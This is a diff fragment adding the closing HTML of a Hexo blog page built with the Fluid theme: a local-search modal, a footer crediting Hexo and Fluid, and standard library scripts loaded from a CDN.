+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
